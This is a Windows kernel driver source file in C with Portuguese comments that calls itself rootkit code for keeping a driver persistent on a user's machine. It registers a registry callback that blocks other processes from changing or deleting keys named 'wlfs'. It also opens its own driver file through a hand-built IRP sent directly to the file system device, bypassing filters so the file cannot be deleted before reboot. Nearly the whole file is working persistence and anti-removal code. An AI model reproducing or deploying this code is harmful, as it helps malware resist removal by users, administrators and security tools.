

///
/// Funções para realizar a proteção do driver e seu serviço
/// Serve como um rootkit, se mantendo persistente na máquina do usuário
/// 
/// Código de projetos antigos meus
///

//
// Operações de registro
//

// Usado para guardar a sessão e remover o monitoramento de registros depois
LARGE_INTEGER CookieRegistro = { 0 };

// Usado para obter o nome de uma chave
NTKERNELAPI NTSTATUS ObQueryNameString(IN PVOID Object, OUT POBJECT_NAME_INFORMATION ObjectNameInfo, IN  ULONG Length, OUT PULONG ReturnLength);

/// <summary>
/// Verifica se é possível acessar o caminho completo de um registro
/// </summary>
/// 
/// <param name="Registro">Local do registro para copiarmos o nome</param>
/// <param name="ObjetoRegistro">Objeto</param>
/// 
/// <returns>Retorna um BOOLEAN para informar se foi sucesso ou falha</returns>
BOOLEAN ObterNomeCompletoDoRegistro(
	IN PUNICODE_STRING Registro,
	IN PVOID ObjetoRegistro
)
{
	BOOLEAN Nome = FALSE;
	BOOLEAN Parcial = FALSE;
	NTSTATUS Status;

	// Verificações
	if (!MmIsAddressValid(ObjetoRegistro) || (ObjetoRegistro) == NULL)
	{
		return FALSE;
	}

	// Falso
	if (!Nome)
	{
		ULONG TamanhoRetornar;

		PUNICODE_STRING ObjetoNome = NULL;

		// Obtenha o nome
		Status = ObQueryNameString(
			ObjetoRegistro,
			(POBJECT_NAME_INFORMATION)ObjetoNome,
			0,
			&TamanhoRetornar
		);

		// Normal, obtemos o tamanho correto para alocar
		if (Status == STATUS_INFO_LENGTH_MISMATCH)
		{
			// Aloque com o tamanho correto
			ObjetoNome = ExAllocatePoolWithTag(PagedPool, TamanhoRetornar, 'kffe');

			if (ObjetoNome)
			{
				Status = ObQueryNameString(
					ObjetoRegistro,
					(POBJECT_NAME_INFORMATION)ObjetoNome,
					TamanhoRetornar, // Tamanho correto
					&TamanhoRetornar
				);

				// Se conseguir
				if (NT_SUCCESS(Status))
				{
					// Copie o valor para o que nós foi passado, assim, a função
					// Que chamou a gente vai obter o valor
					RtlCopyUnicodeString(Registro, ObjetoNome);

					// Conseguimos
					Nome = TRUE;
				}

				// Libere
				ExFreePoolWithTag(ObjetoNome, 'kffe');
			}
		}
	}

	// Retorne
	return Nome;

}

/// <summary>
/// Monitra as operações de reigstro
/// </summary>
/// 
/// <param name="Contexto">Contexto</param>
/// <param name="Argumento1">Argumento</param>
/// <param name="Argumento2">Argumento</param>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS OperacaoRegistro(
	PVOID Contexto,
	PVOID Argumento1,
	PVOID Argumento2
)
{
	NTSTATUS RetornarStatus = STATUS_SUCCESS;

	__try {



		// REG_NOTIFY_CLASS
		REG_NOTIFY_CLASS Class = (REG_NOTIFY_CLASS)(ULONG_PTR)Argumento1;

		// Local do registro, onde ficará armazenado o valor
		UNICODE_STRING LocalRegistro;

		// Tamanho 0
		LocalRegistro.Length = 0;

		// Tamanho máximo para RegistryPath
		LocalRegistro.MaximumLength = 1024 * sizeof(WCHAR);

		// Aloque um espaço na memória para o RegistryPath
		LocalRegistro.Buffer = ExAllocatePoolWithTag(PagedPool, LocalRegistro.MaximumLength, 'effg');

		if (LocalRegistro.Buffer == NULL)
		{
			// Retorne
			return STATUS_MEMORY_NOT_ALLOCATED;
		}

		// Vamos verificar se é uma operação que queremos rastrear
		if (

			// Deletando um valor de uma chave
			RegNtPreDeleteValueKey == Class ||

			// Deletando uma chave (pasta)
			RegNtPreDeleteKey == Class ||

			// Setando um valor em uma chave
			RegNtPreSetValueKey == Class ||

			// Nova chave criada
			RegNtPreCreateKey == Class ||

			RegNtPreSetKeySecurity == Class ||

			// Renomeando uma chave
			RegNtPreRenameKey == Class

			)
		{
			// Obtenha o nome do registro que está sendo modificaod
			BOOLEAN Obter = ObterNomeCompletoDoRegistro(
				// Copie o valor de volta pra esse carinha
				&LocalRegistro,

				// Argumento
				((PREG_SET_VALUE_KEY_INFORMATION)Argumento2)->Object
			);

			// Deixe em minusculo
			_wcslwr(LocalRegistro.Buffer);

			if (Obter == TRUE)
			{
				if (
					// Se for o driver
					wcsstr(LocalRegistro.Buffer, L"wlfs") != NULL
					)
				{
					if (PsGetCurrentProcess() != ProcessoNottextBackup)
					{
						// Acesso negado
						RetornarStatus = STATUS_ACCESS_DENIED;
					}
				}
			}
		}

		// Se estiver diferente de NULL, o valor foi alocado
		if (LocalRegistro.Buffer != NULL)
		{
			// Libere o valor que alocamos
			ExFreePoolWithTag(LocalRegistro.Buffer, 'effg');
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}

	// Status
	return RetornarStatus;
}


/// <summary>
/// Instala a monitoração de registro
/// </summary>
/// 
/// <param name="DriverObject">DriverObjet</param>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS InstalarMonitoracaoDeRegistro(
	IN PDRIVER_OBJECT DriverObject // DriverObject
)
{
	// Status
	NTSTATUS Status = STATUS_SUCCESS;

	// Altitude da proteção de registro
	UNICODE_STRING Altitude = RTL_CONSTANT_STRING("354321");

	// Registre a proteção
	Status = CmRegisterCallbackEx(
		OperacaoRegistro, // Função de proteção
		&Altitude, // Altitude
		DriverObject,
		NULL,
		&CookieRegistro, // Salve a sessão
		NULL
	);

	// Status
	return Status;
}


/// <summary>
/// Remove a monitoração de registro
/// </summary>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS RemoverMonitorDeRegistro()
{
	NTSTATUS Status = STATUS_SUCCESS;

	// Remova a proteção de registro
	Status = CmUnRegisterCallback(CookieRegistro);

	// Sucesso
	return Status;
}








//
// Operações para forçar a remoção de um arquivo
//

/// <summary>
/// Abre um objeto apartir de um ponteiro
/// </summary>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS ObOpenObjectByPointer(
	PVOID Object,
	ULONG HandleAttributes,
	PACCESS_STATE PassedAccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PHANDLE Handle
);

/// <summary>
/// Esta função aloca espaço para um objeto NT de qualquer
/// Pool paginado ou não paginado.Ele captura o nome opcional e
/// Parâmetros SECURITY_DESCRIPTOR para uso posterior quando o objeto é
/// inserido em uma tabela de objetos. Nenhuma cota é cobrada neste momento.
/// Isso ocorre quando o objeto é inserido em uma tabela de objetos.
/// </summary>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS ObCreateObject(
	KPROCESSOR_MODE ProbeMode,
	POBJECT_TYPE ObjectType,
	POBJECT_ATTRIBUTES ObjectAttributes,
	KPROCESSOR_MODE OwnershipMode,
	PVOID ParseContext,
	ULONG ObjectBodySize,
	ULONG PagedPoolCharge,
	ULONG NonPagedPoolCharge,
	PVOID* Object
);

/// <summary>
/// sua rotina inicializa uma estrutura ACCESS_STATE.  Isto consiste do:
/// -zerando toda a estrutura
/// 
/// -mapeamento de tipos de acesso genéricos no DesiredAccess passado
/// e colocá - lo na estrutura
/// 
/// -"capturar" o Contexto do Assunto, que deve ser realizado para o
/// duração da tentativa de acesso(pelo menos até que a auditoria seja realizada).
/// 
/// -Alocar um ID de operação, que é um LUID que será usado
/// associar diferentes partes da tentativa de acesso na auditoria registro.
/// </summary>
/// 
/// <param name="AccessState">Acesso e estado</param>
/// <param name="AuxData">AuxData</param>
/// <param name="DesiredAccess">Retornar acesso</param>
/// <param name="GenericMapping">2Arquivo de mapeamento</param>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS SeCreateAccessState(PACCESS_STATE AccessState, PVOID AuxData, ACCESS_MASK DesiredAccess, PGENERIC_MAPPING GenericMapping);

/// <summary>
/// Estrutura
/// </summary>
typedef struct _AUX_ACCESS_DATA {
	PPRIVILEGE_SET PrivilegesUsed;
	GENERIC_MAPPING GenericMapping;
	ACCESS_MASK AccessesToAudit;
	ACCESS_MASK MaximumAuditMask;
	ULONG Unknown[256];
} AUX_ACCESS_DATA, * PAUX_ACCESS_DATA;

/// <summary>
/// Completa a rotina
/// </summary>
/// 
/// <param name="ObjetoDispositivo">Objeto dispositivo</param>
/// <param name="Irp">Irp</param>
/// <param name="OPTIONAL">OPTIONAL</param>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS CompletarAtributo(_In_ PDEVICE_OBJECT ObjetoDispositivo, _In_ PIRP Irp, _In_ PVOID Contexto OPTIONAL)
{
	// Configure o STATUS
	*Irp->UserIosb = Irp->IoStatus;

	// Se tiver o evento
	if (Irp->UserEvent)
		KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, 0);

	// Se tiver um buffer
	if (Irp->MdlAddress)
	{
		// Libere-o
		IoFreeMdl(Irp->MdlAddress);
		Irp->MdlAddress = NULL;
	}

	// Libere o IRP
	IoFreeIrp(Irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

/// <summary>
/// Obtém o dispositivo
/// </summary>
/// 
/// <param name="NomeDriver">Nome do driver de dispositivo para se conectar</param>
/// <param name="ObjetoDispositivo">Referência para um DEVICE_OBJECT</param>
/// <param name="LerDispositivo">Ler dispositivo</param>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS ObterDriverDispositivo(_In_ PUNICODE_STRING NomeDriver, _Out_ PDEVICE_OBJECT* ObjetoDispositivo, _Out_ PDEVICE_OBJECT* LerDispositivo)
{

	// Status
	NTSTATUS Status;

	// Atributos e outros
	OBJECT_ATTRIBUTES Atributos;
	HANDLE DeviceHandle = NULL;
	IO_STATUS_BLOCK ioStatus;
	PFILE_OBJECT ObjetoArquivo;

	// Verifique se algum é NULL
	if (NomeDriver == NULL || ObjetoDispositivo == NULL || LerDispositivo == NULL)
		return STATUS_INVALID_PARAMETER;

	// Inicie os atributos
	InitializeObjectAttributes(&Atributos, NomeDriver, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// Abra o arquivo (Driver, não o arquivo que mandamos)
	Status = IoCreateFile(
		&DeviceHandle,
		SYNCHRONIZE | FILE_ANY_ACCESS,
		&Atributos,
		&ioStatus, NULL, 0,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE,
		NULL, 0,
		CreateFileTypeNone, NULL,
		IO_NO_PARAMETER_CHECKING
	);

	// Se falhar
	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	// Acesse o indentificador da alça
	Status = ObReferenceObjectByHandle(DeviceHandle, FILE_READ_DATA, *IoFileObjectType, KernelMode, &ObjetoArquivo, NULL);

	// Se falhar
	if (!NT_SUCCESS(Status))
	{
		ZwClose(DeviceHandle);
		return Status;
	}

	// Se for 0
	if (ObjetoArquivo->Vpb == 0 || ObjetoArquivo->Vpb->RealDevice == NULL)
	{
		// Saia
		ObDereferenceObject(ObjetoArquivo);
		ZwClose(DeviceHandle);
		return STATUS_UNSUCCESSFUL;
	}

	// Obtenha os dispositivos
	*ObjetoDispositivo = ObjetoArquivo->Vpb->DeviceObject;
	*LerDispositivo = ObjetoArquivo->Vpb->RealDevice;

	// Feche
	ObDereferenceObject(ObjetoArquivo);
	ZwClose(DeviceHandle);

	return STATUS_SUCCESS;
}

#define SYMBOLICLINKLENG            6
#define MAX_PATH					600 

/// <summary>
/// Abre um arquivo com IRP
/// </summary>
/// 
/// <param name="Arquivo">UNICODE para o arquivo</param>
/// <param name="Acesso">Acesso apra abertuda</param>
/// <param name="Io">Io</param>
/// <param name="ObjetoArquivo">Rerêrencia para salvar o PFILE_OBJECT da sessão</param>
/// 
/// <returns>Retornau um NTSTATUS</returns>
NTSTATUS AbrirArquivoIRP(_In_ UNICODE_STRING Arquivo, _In_ ACCESS_MASK Acesso, _In_ PIO_STATUS_BLOCK Io, _Out_ PFILE_OBJECT* ObjetoArquivo, USHORT CompartilharAcesso)
{
	// Status
	NTSTATUS Status;

	// IRP e evento
	PIRP Irp;
	KEVENT Evento;

	// Acesso
	static ACCESS_STATE AccessState;
	static AUX_ACCESS_DATA AuxData;

	// Atributos e contexto
	OBJECT_ATTRIBUTES Atributos;
	PFILE_OBJECT NovoObjetoArquivo;
	IO_SECURITY_CONTEXT SecurityContext;
	PIO_STACK_LOCATION IrpSp;

	// Dispositivos
	PDEVICE_OBJECT ObjetoDispositivo = NULL;
	PDEVICE_OBJECT LerDispositivo = NULL;

	// Nome do driver
	UNICODE_STRING NomeDriver;
	wchar_t* ArquivoBuf = NULL;
	static wchar_t Caminho[MAX_PATH] = { 0 };

	// Zere a memória
	RtlZeroMemory(Caminho, sizeof(Caminho));

	// Copie o valor
	RtlCopyMemory(Caminho, Arquivo.Buffer, (SYMBOLICLINKLENG + 1) * sizeof(wchar_t));

	// Inicie o UNICODE_STRING
	RtlInitUnicodeString(&NomeDriver, Caminho);

	// Obtenha o driver
	Status = ObterDriverDispositivo(&NomeDriver, &ObjetoDispositivo, &LerDispositivo);

	// Se falhar
	if (!NT_SUCCESS(Status))
	{
		// Pare
		RtlZeroMemory(Caminho, sizeof(Caminho));
		return Status;
	}

	// Zere a memória
	RtlZeroMemory(Caminho, sizeof(Caminho));

	// Copie
	RtlCopyMemory(Caminho, &Arquivo.Buffer[SYMBOLICLINKLENG], Arquivo.Length - SYMBOLICLINKLENG);

	// Inicie o UNICODE
	RtlInitUnicodeString(&NomeDriver, Caminho);

	// Aloque
	ArquivoBuf = ExAllocatePool(NonPagedPool, NomeDriver.MaximumLength);

	// Se não conseguir
	if (ArquivoBuf == NULL)
	{
		// Pare
		RtlZeroMemory(Caminho, sizeof(Caminho));
		return STATUS_UNSUCCESSFUL;
	}

	// Zere
	RtlZeroMemory(ArquivoBuf, NomeDriver.MaximumLength);

	// Copie para o ArquivoBuf
	RtlCopyMemory(ArquivoBuf, NomeDriver.Buffer, NomeDriver.Length);

	// Se for NULL
	if (ObjetoDispositivo == NULL || LerDispositivo == NULL || ObjetoDispositivo->StackSize <= 0)
	{
		// Pare
		RtlZeroMemory(Caminho, sizeof(Caminho));
		ExFreePool(ArquivoBuf);
		return STATUS_UNSUCCESSFUL;
	}

	// Limpe o 'Caminho', não queremos ocupar espaço na memória
	RtlZeroMemory(Caminho, sizeof(Caminho));

	// Inicie os atributos
	InitializeObjectAttributes(&Atributos, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	// Inicie o objeto
	Status = ObCreateObject(KernelMode, *IoFileObjectType, &Atributos, KernelMode, NULL, sizeof(FILE_OBJECT), 0, 0, &NovoObjetoArquivo);

	// Se falhar
	if (!NT_SUCCESS(Status))
	{
		ExFreePool(ArquivoBuf);
		return Status;
	}

	// Aloque o IRP
	Irp = IoAllocateIrp(ObjetoDispositivo->StackSize, FALSE);

	// Se não conseguir
	if (Irp == NULL)
	{
		// Realize as operações
		ExFreePool(ArquivoBuf);
		ObDereferenceObject(NovoObjetoArquivo);
		return STATUS_UNSUCCESSFUL;
	}

	// Inicie o evento
	KeInitializeEvent(&Evento, SynchronizationEvent, FALSE);

	// Zere o valor
	RtlZeroMemory(NovoObjetoArquivo, sizeof(FILE_OBJECT));
	NovoObjetoArquivo->Type = IO_TYPE_FILE;
	NovoObjetoArquivo->Size = sizeof(FILE_OBJECT);
	NovoObjetoArquivo->DeviceObject = LerDispositivo;
	NovoObjetoArquivo->Flags = FO_SYNCHRONOUS_IO;

	// Inicie o UNICODE
	RtlInitUnicodeString(&NovoObjetoArquivo->FileName, ArquivoBuf);

	// Inicie o evento
	KeInitializeEvent(&NovoObjetoArquivo->Lock, SynchronizationEvent, FALSE);
	KeInitializeEvent(&NovoObjetoArquivo->Event, NotificationEvent, FALSE);

	// Incie a estrutura de acesso
	Status = SeCreateAccessState(&AccessState, &AuxData, Acesso, IoGetFileObjectGenericMapping());

	// Se falhar
	if (!NT_SUCCESS(Status))
	{
		// Libere o IRP
		IoFreeIrp(Irp);
		ObDereferenceObject(NovoObjetoArquivo);
		return Status;
	}

	SecurityContext.SecurityQos = NULL;
	SecurityContext.AccessState = &AccessState;
	SecurityContext.DesiredAccess = Acesso;
	SecurityContext.FullCreateOptions = 0;

	// Configure o IRP
	Irp->MdlAddress = NULL;
	Irp->AssociatedIrp.SystemBuffer = NULL;
	Irp->Flags = IRP_CREATE_OPERATION | IRP_SYNCHRONOUS_API;

	Irp->RequestorMode = KernelMode;
	Irp->UserIosb = Io;
	Irp->UserEvent = &Evento;
	Irp->PendingReturned = FALSE;
	Irp->Cancel = FALSE;
	Irp->CancelRoutine = NULL;
	Irp->Tail.Overlay.Thread = PsGetCurrentThread();
	Irp->Tail.Overlay.AuxiliaryBuffer = NULL;
	Irp->Tail.Overlay.OriginalFileObject = NovoObjetoArquivo;

	// Proximo local do IRP
	IrpSp = IoGetNextIrpStackLocation(Irp);
	IrpSp->MajorFunction = IRP_MJ_CREATE;
	IrpSp->DeviceObject = ObjetoDispositivo;
	IrpSp->FileObject = NovoObjetoArquivo;
	IrpSp->Parameters.Create.SecurityContext = &SecurityContext;
	IrpSp->Parameters.Create.Options = (FILE_OPEN_IF << 24) | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_FOR_BACKUP_INTENT;
	IrpSp->Parameters.Create.FileAttributes = FILE_ATTRIBUTE_NORMAL;

	IrpSp->Parameters.Create.ShareAccess = CompartilharAcesso;

	IrpSp->Parameters.Create.EaLength = 0;

	// Complete o IRP
	IoSetCompletionRoutine(Irp, CompletarAtributo, 0, TRUE, TRUE, TRUE);

	// Chame o Driver de dispositivo
	Status = IoCallDriver(ObjetoDispositivo, Irp);

	// Se for pendente
	if (Status == STATUS_PENDING)
	{
		// Espere
		KeWaitForSingleObject(&Evento, Executive, KernelMode, TRUE, 0);
	}

	// Se falhar
	if (!NT_SUCCESS(Status))
	{
		// Zere
		NovoObjetoArquivo->DeviceObject = NULL;
		ObDereferenceObject(NovoObjetoArquivo);
	}

	// Se não falahr
	else
	{
		// Incrementa um valor de váriavel
		InterlockedIncrement(&NovoObjetoArquivo->DeviceObject->ReferenceCount);

		//
		if (NovoObjetoArquivo->Vpb)
		{
			InterlockedIncrement(&NovoObjetoArquivo->Vpb->ReferenceCount);
		}

		// FileObject
		*ObjetoArquivo = NovoObjetoArquivo;

		//ObDereferenceObject(pNewFileObject);  
	}

	return Status;
}







UNICODE_STRING LocalDriver = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\System32\\drivers\\WlfS.sys");

/// <summary>
/// Instala a proteção do driver
/// </summary>
/// 
/// <returns>Retorna um NTSTATUS</returns>
NTSTATUS InstalarTodaAProtecaoProDriver()
{
	NTSTATUS Status = STATUS_SUCCESS;

	__try {


		// IO
		IO_STATUS_BLOCK IoFF;
		PFILE_OBJECT ObjetoArquivoFF;

		// Abra o arquivo por IRP, assim, ele será indeletável
		// Não usaremos o minifiltro, porque ele pode ser interrompido por outros
		// Drivers, mas depois que for aberto por um IRP, ele nunca poderá ser modificado
		// Até reiniciar
		Status = AbrirArquivoIRP(LocalDriver, GENERIC_READ | DELETE, &IoFF, &ObjetoArquivoFF, FILE_SHARE_READ);

	} __except (EXCEPTION_EXECUTE_HANDLER) { }

	return Status;
}

